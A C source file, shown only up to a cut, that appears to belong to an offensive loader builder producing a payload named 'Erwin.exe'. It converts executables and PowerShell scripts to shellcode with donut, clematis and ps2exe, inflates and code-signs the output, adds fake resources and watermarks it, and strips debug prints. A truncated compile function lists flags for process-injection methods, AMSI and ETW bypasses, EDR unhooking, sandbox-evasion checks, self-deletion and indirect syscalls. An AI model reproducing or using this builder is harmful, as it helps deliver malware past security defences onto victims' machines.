#include <windows.h>
#include <stdio.h>
#include "Common.h"
#include <string.h>
#include <time.h>

BOOL ReportError(const char* ApiName) {
	printf("[!] \"%s\" [ FAILED ] \t%d \n", ApiName, GetLastError());
	return FALSE;
}


//With preamble 0xfc 0x48
BOOL ReadPayloadFile(const char* FileInput, PDWORD sPayloadSize, unsigned char** pPayloadData) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD FileSize = NULL;
	DWORD lpNumberOfBytesRead = NULL;

	hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return ReportError("CreateFileA");
	}

	FileSize = GetFileSize(hFile, NULL);

	// Allocate memory for the payload including the preamble
	unsigned char* Payload = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, FileSize + 2);
	if (Payload == NULL) {
		CloseHandle(hFile);
		return ReportError("HeapAlloc");
	}

	// Set the preamble
	Payload[0] = 0xfc;
	Payload[1] = 0x48;

	// Read the file into the buffer after the preamble
	if (!ReadFile(hFile, Payload + 2, FileSize, &lpNumberOfBytesRead, NULL)) {
		HeapFree(GetProcessHeap(), 0, Payload);
		CloseHandle(hFile);
		return ReportError("ReadFile");
	}

	*pPayloadData = Payload;
	*sPayloadSize = lpNumberOfBytesRead + 2;

	CloseHandle(hFile);

	if (*pPayloadData == NULL || *sPayloadSize == NULL)
		return FALSE;

	return TRUE;
}

// read file from disk 
BOOL ReadPayloadFile2(const char* FileInput, PDWORD sPayloadSize, unsigned char** pPayloadData) {


	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD FileSize = NULL;
	DWORD lpNumberOfBytesRead = NULL;

	hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return ReportError("CreateFileA");
	}

	FileSize = GetFileSize(hFile, NULL);

	unsigned char* Payload = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, FileSize);

	ZeroMemory(Payload, FileSize);

	if (!ReadFile(hFile, Payload, FileSize, &lpNumberOfBytesRead, NULL)) {
		return ReportError("ReadFile");
	}


	*pPayloadData = Payload;
	*sPayloadSize = lpNumberOfBytesRead;

	CloseHandle(hFile);

	if (*pPayloadData == NULL || *sPayloadSize == NULL)
		return FALSE;

	return TRUE;
}




// write file to disk
BOOL WritePayloadFile(const char* FileInput, DWORD sPayloadSize, unsigned char* pPayloadData) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	lpNumberOfBytesWritten = NULL;

	hFile = CreateFileA(FileInput, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return ReportError("CreateFileA");


	if (!WriteFile(hFile, pPayloadData, sPayloadSize, &lpNumberOfBytesWritten, NULL) || sPayloadSize != lpNumberOfBytesWritten)
		return ReportError("WriteFile");

	CloseHandle(hFile);

	return TRUE;
}

void RedirectStdoutToFile(const char* filename) {
	freopen(filename, "w", stdout);
}

BOOL EndsWith(const char* str, const char* suffix) {
	if (!str || !suffix)
		return FALSE;
	size_t lenstr = strlen(str);
	size_t lensuffix = strlen(suffix);
	if (lensuffix > lenstr)
		return FALSE;
	return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}


void donut(int argc, char* argv[]) {
	printf("[+] Running donut\n");
	// Buffer to hold the current working directory
	char exePath[MAX_PATH];

	// Get the path of the current executable
	DWORD pathLength = GetFullPathName(argv[0], MAX_PATH, exePath, NULL);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("Failed to get the full path of the executable.\n");
		return;
	}

	// Prompt the user for parameters
	char userResponse;
	char parameters[256] = "";

	printf("[+] Do you want to include parameters? (Y/N): ");
	int response = scanf("%c", &userResponse);

	// Clear the input buffer to handle the Enter key properly
	while (getchar() != '\n');

	// Handle the case where Enter is pressed (no input)
	if (response == EOF || userResponse == '\n') {
		userResponse = 'N';
	}

	if (userResponse == 'Y' || userResponse == 'y') {
		printf("[+] Enter parameters: ");
		scanf(" %255[^\n]", parameters);
	}

	// Build the command to set the PATH
	char setPathCmd[1024];
	sprintf(setPathCmd, "set PATH=%s\\founding\\generators\\donut;%%PATH%%", exePath);

	char gccCmd[1024];
	if (userResponse == 'Y' || userResponse == 'y') {
		snprintf(gccCmd, sizeof(gccCmd), "%s && founding\\generators\\donut\\donut.exe -i %s -o output\\code\\Erwin.bin -b 1 -p \"%s\"", setPathCmd, argv[1], parameters);
	}
	else {
		snprintf(gccCmd, sizeof(gccCmd), "%s && founding\\generators\\donut\\donut.exe -i %s -o output\\code\\Erwin.bin -b 1", setPathCmd, argv[1]);
	}

	// Execute the command
	int result = system(gccCmd);

	if (result != 0) {
		printf("[-] Failed to create Erwin.bin using donut.\n");
		return;
	}
	else {
		printf("\n[+] Erwin.bin created using donut.\n");
	}
}


void inflate(int argc, char* argv[], int inflations) {

	// Buffer to hold the current working directory
	char exePath[MAX_PATH];

	// Get the FULL path of the current executable (with drive letter)
	DWORD pathLength = GetModuleFileNameA(NULL, exePath, MAX_PATH);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("[-] Failed to get the full path of the executable.\n");
		return;
	}

	// Extract directory path by removing the executable name
	char* lastBackslash = strrchr(exePath, '\\');
	if (lastBackslash) {
		*lastBackslash = '\0'; // Truncate to directory path
	}

	// Construct the full path to inflate.exe
	char inflateExePath[MAX_PATH];
	sprintf(inflateExePath, "%s\\founding\\misc\\inflate\\inflate.exe", exePath);

	// Construct the path to Erwin.exe
	char erwinPath[MAX_PATH];
	sprintf(erwinPath, "%s\\output\\erwin\\Erwin.exe", exePath);

	// Build the command with proper paths
	char inflateCmd[1024];
	sprintf(inflateCmd, "\"%s\" \"%s\" %d",
		inflateExePath, erwinPath, inflations);

	// Execute the command
	printf("[+] Inflating Erwin.exe with %d MBs...\n", inflations);

	// Initialize the STARTUPINFO structure with settings to hide output
	STARTUPINFOA Si = { sizeof(Si) };
	Si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	Si.wShowWindow = SW_HIDE;  // Hide the window

	// Create pipes for redirecting stdout and stderr to NULL
	HANDLE hNULL = CreateFileA("NUL", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNULL != INVALID_HANDLE_VALUE) {
		Si.hStdOutput = hNULL;
		Si.hStdError = hNULL;
	}

	PROCESS_INFORMATION Pi;

	// Create the process with the correct command and redirected output
	if (!CreateProcessA(NULL, inflateCmd, NULL, NULL, TRUE, 0, NULL, NULL, &Si, &Pi)) {
		DWORD error = GetLastError();
		printf("[-] Failed to start inflate process. Error code: %d\n", error);
		if (hNULL != INVALID_HANDLE_VALUE) {
			CloseHandle(hNULL);
		}
		return;
	}

	// Wait for the process to complete
	WaitForSingleObject(Pi.hProcess, INFINITE);

	// Get the exit code
	DWORD exitCode;
	if (GetExitCodeProcess(Pi.hProcess, &exitCode)) {
		if (exitCode == 0) {
			//printf("[+] Successfully inflated Erwin.exe %d times.\n", inflations);
		}
		else {
			//printf("[-] Failed to inflate Erwin.exe (Exit code: %d).\n", exitCode);
		}
	}
	else {
		printf("[-] Failed to get process exit code (%d).\n", GetLastError());
	}

	// Clean up
	CloseHandle(Pi.hProcess);
	CloseHandle(Pi.hThread);
	if (hNULL != INVALID_HANDLE_VALUE) {
		CloseHandle(hNULL);
	}
}



void sign(const char* pfxFile, const char* password) {
	char exePath[MAX_PATH];
	char signToolDir[MAX_PATH];
	char currentDir[MAX_PATH];
	char relativePfxPath[MAX_PATH];
	char relativeErwinPath[MAX_PATH];

	// Get the full path of the current executable
	DWORD pathLength = GetModuleFileNameA(NULL, exePath, MAX_PATH);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("[-] Failed to get the full path of the executable.\n");
		return;
	}

	// Extract directory path by removing the executable name
	char* lastBackslash = strrchr(exePath, '\\');
	if (lastBackslash) {
		*lastBackslash = '\0'; // Truncate to directory path
	}

	// Save current directory
	GetCurrentDirectoryA(MAX_PATH, currentDir);

	// Construct paths
	_snprintf_s(signToolDir, sizeof(signToolDir), _TRUNCATE,
		"%s\\founding\\misc\\sign", exePath);

	// Convert to relative paths
	// For PFX file, create a relative path (assuming absolute path was provided)
	if (strstr(pfxFile, exePath) != NULL) {
		// If the pfxFile contains the exePath, we can make it relative
		strcpy(relativePfxPath, "..\\..\\..\\");
		strcat(relativePfxPath, pfxFile + strlen(exePath) + 1); // +1 to skip the backslash
	}
	else {
		// Use whatever was provided (might be already relative)
		strcpy(relativePfxPath, pfxFile);
	}

	// Erwin.exe is always in output folder
	strcpy(relativeErwinPath, "..\\..\\..\\output\\erwin\\Erwin.exe");

	// Build the command with relative paths
	char signCmd[1024];
	if (password && *password) {
		_snprintf_s(signCmd, sizeof(signCmd), _TRUNCATE,
			"SignToolEx.exe sign /t \"http://timestamp.digicert.com\" /v /fd SHA256 /f %s /p \"%s\" %s",
			relativePfxPath, password, relativeErwinPath);
	}
	else {
		_snprintf_s(signCmd, sizeof(signCmd), _TRUNCATE,
			"SignToolEx.exe sign /v /fd SHA256 /f %s %s",
			relativePfxPath, relativeErwinPath);
	}

	printf("[+] Signing Erwin.exe with certificate %s\n", pfxFile);
	printf("[+] Signing command: %s\n", signCmd);

	// Change directory to the sign tool directory
	if (!SetCurrentDirectoryA(signToolDir)) {
		printf("[-] Failed to change directory to %s. Error: %d\n", signToolDir, GetLastError());
		return;
	}

	// Create pipes for capturing output
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
		printf("[-] Failed to create pipe for process output.\n");
		SetCurrentDirectoryA(currentDir);
		return;
	}

	// Create the process with the correct command and redirected output
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;

	// Redirect standard output and error to the pipe
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

	if (!CreateProcessA(NULL, signCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		DWORD error = GetLastError();
		printf("[-] Failed to start signing process. Error code: %d\n", error);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		SetCurrentDirectoryA(currentDir);
		return;
	}

	// Close the write end of the pipe since we don't need it
	CloseHandle(hWritePipe);

	// Read output from the pipe
	char buffer[4096];
	DWORD bytesRead;
	BOOL success = FALSE;

	printf("[+] SignToolEx output:\n");
	printf("----------------------------------------\n");

	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		printf("%s", buffer);

		// Look for success indicators in the output
		if (strstr(buffer, "Successfully") != NULL) {
			success = TRUE;
		}
	}

	printf("----------------------------------------\n");

	// Wait for the process to complete
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Get the exit code
	DWORD exitCode;
	if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
		if (exitCode == 0 || success) {
			//printf("[+] Signing succeeded\n");
		}
		else {
			printf("[-] Signing failed (Exit code: %d).\n", exitCode);
		}
	}
	else {
		printf("[-] Failed to get process exit code (%d).\n", GetLastError());
	}

	// Clean up
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);

	// Restore original directory
	SetCurrentDirectoryA(currentDir);
}




void addResources(int argc, char* argv[]) {
	// Buffer to hold the current working directory
	char exePath[MAX_PATH];

	// Get the path of the current executable
	DWORD pathLength = GetFullPathName(argv[0], MAX_PATH, exePath, NULL);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("[-] Failed to get the full path of the executable.\n");
		return;
	}

	// Build the command to run Resource Hacker
	char resourceCmd[1024];
	snprintf(resourceCmd, sizeof(resourceCmd),
		"founding\\misc\\resources\\ResourceHacker.exe -open output\\erwin\\Erwin.exe -save output\\erwin\\Erwin.exe -action addoverwrite -resource founding\\misc\\resources\\resources.res");

	// Initialize the STARTUPINFO structure with settings to hide output
	STARTUPINFOA Si = { sizeof(Si) };
	Si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	Si.wShowWindow = SW_HIDE;  // Hide the window

	// Create pipes for redirecting stdout and stderr
	HANDLE hNULL = CreateFileA("NUL", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNULL != INVALID_HANDLE_VALUE) {
		Si.hStdOutput = hNULL;
		Si.hStdError = hNULL;
	}

	PROCESS_INFORMATION Pi;

	// Create the process
	if (!CreateProcessA(NULL, resourceCmd, NULL, NULL, TRUE, 0, NULL, NULL, &Si, &Pi)) {
		printf("[-] ResourceHacker process failed (%d).\n", GetLastError());
		if (hNULL != INVALID_HANDLE_VALUE) {
			CloseHandle(hNULL);
		}
		return;
	}

	// Wait for the process to complete
	WaitForSingleObject(Pi.hProcess, INFINITE);

	// Get the exit code
	DWORD exitCode;
	if (GetExitCodeProcess(Pi.hProcess, &exitCode)) {
		if (exitCode == 0) {
			//printf("[+] Successfully added resources to Erwin.exe.\n");
		}
		else {
			//printf("[-] Failed to add resources to Erwin.exe (Exit code: %d).\n", exitCode);
		}
	}
	else {
		printf("[-] Failed to get process exit code (%d).\n", GetLastError());
	}

	// Clean up
	CloseHandle(Pi.hProcess);
	CloseHandle(Pi.hThread);
	if (hNULL != INVALID_HANDLE_VALUE) {
		CloseHandle(hNULL);
	}
}



void watermark(int argc, char* argv[]) {
	//printf("[+] Running watermark\n");
	// Buffer to hold the current working directory
	char exePath[MAX_PATH];

	// Get the path of the current executable
	DWORD pathLength = GetFullPathName(argv[0], MAX_PATH, exePath, NULL);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("[-] Failed to get the full path of the executable.\n");
		return;
	}

	// Build the command to run watermark
	char watermarkCmd[1024];
	snprintf(watermarkCmd, sizeof(watermarkCmd),
		"founding\\misc\\watermark\\watermark.exe -t \"MZ\" -c 0x45725749 -e \".DLL\" -s .data,\"StandardResourceData\" -o output\\erwin\\Erwin.exe output\\erwin\\Erwin.exe");

	// Initialize the STARTUPINFO structure
	STARTUPINFOA Si = { sizeof(Si) };
	PROCESS_INFORMATION Pi;

	// Create the process
	if (!CreateProcessA(NULL, watermarkCmd, NULL, NULL, FALSE, 0, NULL, NULL, &Si, &Pi)) {
		printf("[-] CreateProcess failed (%d).\n", GetLastError());
		return;
	}

	// Wait for the process to complete
	WaitForSingleObject(Pi.hProcess, INFINITE);

	// Get the exit code
	DWORD exitCode;
	if (GetExitCodeProcess(Pi.hProcess, &exitCode)) {
		if (exitCode == 0) {
			//printf("[+] Successfully watermarked Erwin.exe.\n");
		}
		else {
			printf("[-] Failed to watermark Erwin.exe (Exit code: %d).\n", exitCode);
		}
	}
	else {
		printf("[-] Failed to get process exit code (%d).\n", GetLastError());
	}

	// Clean up
	CloseHandle(Pi.hProcess);
	CloseHandle(Pi.hThread);
}


BOOL powershell_donut(int argc, char* argv[]) {
	char exePath[MAX_PATH];
	char tempExePath[MAX_PATH];
	BOOL result = FALSE;

	const char* psScriptPath = argv[1];
	const char* outputBinPath = "output\\code\\Erwin.bin";

	// Get the path of the current executable
	DWORD pathLength = GetModuleFileNameA(NULL, exePath, MAX_PATH);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("[-] Failed to get the full path of the executable.\n");
		return FALSE;
	}

	// Extract directory path from executable path
	char* lastBackslash = strrchr(exePath, '\\');
	if (lastBackslash) {
		*lastBackslash = '\0';
	}

	// Create temporary path for the .exe file
	snprintf(tempExePath, sizeof(tempExePath), "%s\\output\\code\\ps_temp.exe", exePath);


	// Step 1: Convert PS1 to EXE using PS2EXE
	char ps2exeCmd[1024];
	snprintf(ps2exeCmd, sizeof(ps2exeCmd),
		"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Import-Module '%s\\founding\\generators\\ps2exe\\ps2exe.ps1'; Invoke-ps2exe '%s' '%s' *>&1 | Out-Null\"",
		exePath, psScriptPath, tempExePath);

	// Initialize the STARTUPINFO structure
	STARTUPINFOA Si = { sizeof(Si) };
	PROCESS_INFORMATION Pi;

	// Create the process
	if (!CreateProcessA(NULL, ps2exeCmd, NULL, NULL, FALSE, 0, NULL, NULL, &Si, &Pi)) {
		printf("[-] PS2EXE process failed (%d).\n", GetLastError());
		return FALSE;
	}

	// Wait for the process to complete
	WaitForSingleObject(Pi.hProcess, INFINITE);

	// Get the exit code
	DWORD exitCode;
	if (!GetExitCodeProcess(Pi.hProcess, &exitCode) || exitCode != 0) {
		printf("[-] PS2EXE failed with exit code: %d\n", exitCode);
		CloseHandle(Pi.hProcess);
		CloseHandle(Pi.hThread);
		return FALSE;
	}

	CloseHandle(Pi.hProcess);
	CloseHandle(Pi.hThread);

	// Verify the executable was created
	HANDLE hTempExe = CreateFileA(tempExePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTempExe == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to generate executable from PowerShell script.\n");
		return FALSE;
	}
	CloseHandle(hTempExe);

	// Step 2: Use donut to convert the EXE to a binary payload
	// Modified to use system() which might be more reliable for executing complex commands
	char donutCmd[1024];
	snprintf(donutCmd, sizeof(donutCmd),
		"cd %s && .\\founding\\generators\\donut\\donut.exe -i \"%s\" -o \"%s\" -b 1 >NUL 2>&1",
		exePath, tempExePath, outputBinPath);

	// Execute the command using system()
	int systemResult = system(donutCmd);
	if (systemResult != 0) {
		printf("[-] Donut failed with result: %d\n", systemResult);
		DeleteFileA(tempExePath);
		return FALSE;
	}

	// Verify the binary was created
	HANDLE hBin = CreateFileA(outputBinPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hBin == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to generate binary payload file.\n");
		DeleteFileA(tempExePath);
		return FALSE;
	}

	DWORD fileSize = GetFileSize(hBin, NULL);
	CloseHandle(hBin);

	// Clean up temporary files
	DeleteFileA(tempExePath);

	return TRUE;
}




void clematis(int argc, char* argv[]) {

	printf("[+] Running clematis.\n");

	// Buffer to hold the current working directory
	char exePath[MAX_PATH];

	// Get the path of the current executable
	DWORD pathLength = GetFullPathName(argv[0], MAX_PATH, exePath, NULL);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("Failed to get the full path of the executable.\n");
		return;
	}

	// Prompt the user for parameters
	char userResponse;
	char parameters[256] = "";

	printf("[+] Do you want to include parameters? (Y/N): ");
	int response = scanf("%c", &userResponse);

	// Clear the input buffer to handle the Enter key properly
	while (getchar() != '\n');

	// Handle the case where Enter is pressed (no input)
	if (response == EOF || userResponse == '\n') {
		userResponse = 'N';
	}

	if (userResponse == 'Y' || userResponse == 'y') {
		printf("[+] Enter parameters: ");
		scanf(" %255[^\n]", parameters);
	}


	// Build the command to set the PATH
	char setPathCmd[1024];
	sprintf(setPathCmd, "set PATH=%s\\founding\\generators\\clementis;%%PATH%%", exePath);

	char gccCmd[1024];
	if (userResponse == 'Y' || userResponse == 'y') {
		snprintf(gccCmd, sizeof(gccCmd), "%s && founding\\generators\\clementis\\python3\\python.exe founding\\generators\\clementis\\clematis.py -f %s -g true -c true -o output\\code\\Erwin.bin -p \"%s\"", setPathCmd, argv[1], parameters);
	}
	else {
		snprintf(gccCmd, sizeof(gccCmd), "%s && founding\\generators\\clementis\\python3\\python.exe founding\\generators\\clementis\\clematis.py -f %s -g true -c true -o output\\code\\Erwin.bin", setPathCmd, argv[1]);
	}


	// Execute the command
	int result = system(gccCmd);

	if (result != 0) {
		printf("[-] Failed to create Erwin.bin using clematis.\n");
		return;
	}
	else {
		printf("[+] Erwin.bin created using clematis.\n");
	}
}


//optional flags
// Function to check for a flag and remove it from the arguments
BOOL CheckAndRemoveFlag(int* argc, char* argv[], const char* flag) {
	for (int i = 1; i < *argc; i++) {
		if (strcmp(argv[i], flag) == 0) {
			// Remove the flag from the arguments
			for (int j = i; j < *argc - 1; j++) {
				argv[j] = argv[j + 1];
			}
			(*argc)--;
			return TRUE;
		}
	}
	return FALSE;
}


void getfilecontentcomment(const char* content, const char* destination, const char* comment) {
	// Get current executable path
	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	// Find last backslash to get directory
	char* lastSlash = strrchr(exePath, '\\');
	if (lastSlash) {
		*(lastSlash + 1) = '\0'; // Truncate at the last slash to get directory
	}

	// Construct full destination path
	char fullDestPath[MAX_PATH];
	strcpy(fullDestPath, exePath);
	strcat(fullDestPath, destination);

	// Open destination file
	FILE* destFile = fopen(fullDestPath, "rb+");
	if (!destFile) {
		printf("Failed to open destination file: %s\n", fullDestPath);
		return;
	}

	// Calculate content size
	size_t srcSize = strlen(content);

	// Get destination content
	fseek(destFile, 0, SEEK_END);
	long destSize = ftell(destFile);
	fseek(destFile, 0, SEEK_SET);
	char* destContent = (char*)malloc(destSize + 1);
	fread(destContent, 1, destSize, destFile);
	destContent[destSize] = '\0';

	// Find insertion point using comment marker
	char* commentPos = strstr(destContent, comment);
	if (!commentPos) {
		printf("Comment marker '%s' not found in %s\n", comment, fullDestPath);
		free(destContent);
		fclose(destFile);
		return;
	}

	// Calculate indentation
	char* lineStart = commentPos;
	while (lineStart > destContent && *(lineStart - 1) != '\n') {
		lineStart--;
	}
	size_t indentSize = commentPos - lineStart;

	// Create indentation string
	char* indent = (char*)malloc(indentSize + 1);
	strncpy(indent, lineStart, indentSize);
	indent[indentSize] = '\0';

	// Indent provided content
	// More accurate allocation for indented content
	size_t numLines = 1; // at least one line
	const char* tmp = content;
	while (*tmp) {
		if (*tmp == '\n') numLines++;
		tmp++;
	}

	char* indentedSrc = (char*)malloc(srcSize + (numLines * indentSize) + 1);
	char* current = indentedSrc;
	const char* srcLine = content;

	// First line
	memcpy(current, indent, indentSize);
	current += indentSize;

	while (*srcLine) {
		// Copy line content
		const char* lineEnd = strchr(srcLine, '\n');
		if (lineEnd) {
			size_t lineLength = lineEnd - srcLine + 1; // +1 for \n
			memcpy(current, srcLine, lineLength);
			current += lineLength;
			srcLine += lineLength;

			// Add indentation for next line if not at end
			if (*srcLine) {
				memcpy(current, indent, indentSize);
				current += indentSize;
			}
		}
		else {
			// Last line without newline
			size_t remaining = strlen(srcLine);
			memcpy(current, srcLine, remaining);
			current += remaining;
			break;
		}
	}
	*current = '\0'; // Ensure null termination without adding a space
	size_t indentedSrcSize = current - indentedSrc;

	// Calculate new content size
	size_t insertionPos = commentPos - destContent + strlen(comment);
	size_t newSize = destSize + indentedSrcSize + 1; // +1 for \n after comment
	char* newContent = (char*)malloc(newSize + 1);

	// Build new content - no extra space between lines
	memcpy(newContent, destContent, insertionPos);
	newContent[insertionPos] = '\n';
	memcpy(newContent + insertionPos + 1, indentedSrc, indentedSrcSize);
	memcpy(newContent + insertionPos + 1 + indentedSrcSize,
		destContent + insertionPos,
		destSize - insertionPos);
	newContent[newSize] = '\0';

	// Write to destination file
	freopen(fullDestPath, "wb", destFile);
	fwrite(newContent, 1, newSize, destFile);

	// Cleanup
	fclose(destFile);
	free(destContent);
	free(indent);
	free(indentedSrc);
	free(newContent);
	/*printf("Content inserted into %s after '%s' with proper indentation!\n",
		fullDestPath, comment);*/
}


void removePrintfStatements() {
	WCHAR exePath[MAX_PATH];
	WCHAR searchPath[MAX_PATH];
	WCHAR filePath[MAX_PATH];
	WIN32_FIND_DATAW findData;
	HANDLE hFind;

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printf("[-] Failed to get executable path.\n");
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct search path for .c files in output folder
	wsprintfW(searchPath, L"%s\\output\\code\\*.c", exePath);

	// Find first .c file
	hFind = FindFirstFileW(searchPath, &findData);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("[-] No .c files found in output folder.\n");
		return;
	}

	do {
		// Skip directories (shouldn't match anyway with *.c search pattern)
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			continue;
		}

		// Construct full file path
		wsprintfW(filePath, L"%s\\output\\code\\%s", exePath, findData.cFileName);

		// Open the file and read its contents
		FILE* sourceFile;
		_wfopen_s(&sourceFile, filePath, L"rb");
		if (!sourceFile) {
			wprintf(L"[-] Failed to open file: %s\n", findData.cFileName);
			continue;
		}

		// Get file size
		fseek(sourceFile, 0, SEEK_END);
		long fileSize = ftell(sourceFile);
		fseek(sourceFile, 0, SEEK_SET);

		// Read file content
		char* buffer = (char*)malloc(fileSize + 1);
		if (!buffer) {
			printf("[-] Failed to allocate memory for file content.\n");
			fclose(sourceFile);
			continue;
		}

		size_t bytesRead = fread(buffer, 1, fileSize, sourceFile);
		buffer[bytesRead] = '\0';
		fclose(sourceFile);

		// Create temporary file for output
		FILE* tempFile;
		WCHAR tempFilePath[MAX_PATH];
		wsprintfW(tempFilePath, L"%s\\output\\code\\%s.temp", exePath, findData.cFileName);
		_wfopen_s(&tempFile, tempFilePath, L"wb");
		if (!tempFile) {
			wprintf(L"[-] Failed to create temporary file for: %s\n", findData.cFileName);
			free(buffer);
			continue;
		}

		// Process line by line, skipping lines with printf
		char* line = buffer;
		char* nextLine;
		BOOL isMultilinePrintf = FALSE;

		while (line && *line) {
			// Find end of current line
			nextLine = strchr(line, '\n');

			if (nextLine) {
				*nextLine = '\0'; // Temporarily terminate the line
			}

			// Check if this is a printf line or part of a multiline printf
			if (strstr(line, "printf(") || isMultilinePrintf) {
				// Check for unclosed parentheses to detect multiline printf
				int openParens = 0;
				char* search = line;

				while (*search) {
					if (*search == '(') openParens++;
					else if (*search == ')') openParens--;
					search++;
				}

				isMultilinePrintf = (openParens > 0);
				// Skip writing this line
			}
			else {
				// Write line to output file
				fprintf(tempFile, "%s", line);
				if (nextLine) fprintf(tempFile, "\n");  // Add back the newline if there was one
			}

			// Move to next line if any
			if (nextLine) {
				line = nextLine + 1;
			}
			else {
				break;
			}
		}

		// Close the temp file
		fclose(tempFile);
		free(buffer);

		// Replace original file with temp file
		DeleteFileW(filePath);
		MoveFileW(tempFilePath, filePath);

		//wprintf(L"[+] Removed printf statements from: %s\n", findData.cFileName);

	} while (FindNextFileW(hFind, &findData) != 0);

	FindClose(hFind);
	//printf("[+] Successfully removed all printf statements from .c files in output folder.\n");
}




void compile_gcc(const char* extra_arg) {
	char exePath[MAX_PATH];
	char compileCommand[8192] = { 0 };
	char sourceFiles[4096] = { 0 };
	char compilerFlags[1024] = "-nostdlib '-Wl,-e,_start'";
	char outputFile[64] = "output\\erwin\\Erwin.exe";

	//exec
	BOOL normal_apc = FALSE;
	BOOL normal_Early_Bird_Suspended = FALSE;
	BOOL normal_Early_Bird_Debug = FALSE;
	BOOL normal_EnumThreadWindows = FALSE;
	BOOL normal_Local_Mapping_Inject = FALSE;
	BOOL normal_Early_Cascade = FALSE;
	BOOL normal_fibers = FALSE;
	BOOL normal_hypnosis = FALSE;
	BOOL normal_tpalloc = FALSE;
	BOOL normal_local_holllowing = FALSE;

	//amsi
	BOOL amsiFlag_opensession = FALSE;
	BOOL amsiFlag_scanbuffer = FALSE;
	BOOL amsiFlag_signature = FALSE;
	BOOL amsiFlag_codetrust = FALSE;
	//unhooking
	BOOL unhookingFlag_diskcreatefile = FALSE;
	BOOL unhookingFlag_knowndlls = FALSE;
	BOOL unhookingFlag_debug = FALSE;
	BOOL unhookingFlag_hookchain = FALSE;
	//etw
	BOOL etwFlag_eventwrite = FALSE;
	BOOL etwFlag_TraceEvent = FALSE;
	BOOL etwFlag_peventwritefull = FALSE;
	//sandbox
	BOOL sandboxFlag_apihammering = FALSE;
	BOOL sandboxFlag_mouseclicks = FALSE;
	BOOL sandboxFlag_resolution = FALSE;
	BOOL sandboxFlag_processes = FALSE;
	BOOL sandboxFlag_hardware = FALSE;
	BOOL sandboxFlag_mwfmoex = FALSE;
	BOOL sandboxFlag_ntdelay = FALSE;
	BOOL sandboxFlag_fibonacci = FALSE;
	//payload-control
	BOOL payloadFlag_control = FALSE;
	BOOL payloadFlag_selfdelete = FALSE;

	//indirect syscalls syswhispers
	BOOL indirectFlag_init_syswhispers = FALSE;
		//exec
	BOOL indirectFlag_syswhispers_apc = FALSE;
	BOOL indirectFlag_syswhispers_earlybird_debug = FALSE;
	BOOL indirectFlag_syswhispers_earlybird_suspended = FALSE;
	BOOL indirectFlag_syswhispers_enumthreadwindows = FALSE;
	BOOL indirectFlag_syswhispers_localmapping = FALSE;
	BOOL indirectFlag_syswhispers_earlycascade = FALSE;
	BOOL indirectFlag_syswhispers_fibers = FALSE;
	BOOL indirectFlag_syswhispers_hypnosis = FALSE;
	BOOL indirectFlag_syswhispers_tpalloc = FALSE;
	BOOL indirectFlag_syswhispers_local_hollowing = FALSE;
		//amsi
	BOOL indirectFlag_syswhispers_opensession = FALSE;
	BOOL indirectFlag_syswhispers_scanbuffer = FALSE;
	BOOL indirectFlag_syswhispers_signature = FALSE;
	BOOL indirectFlag_syswhispers_codetrust = FALSE;
		//unhooking
	BOOL indirectFlag_syswhispers_diskcreatefile = FALSE;
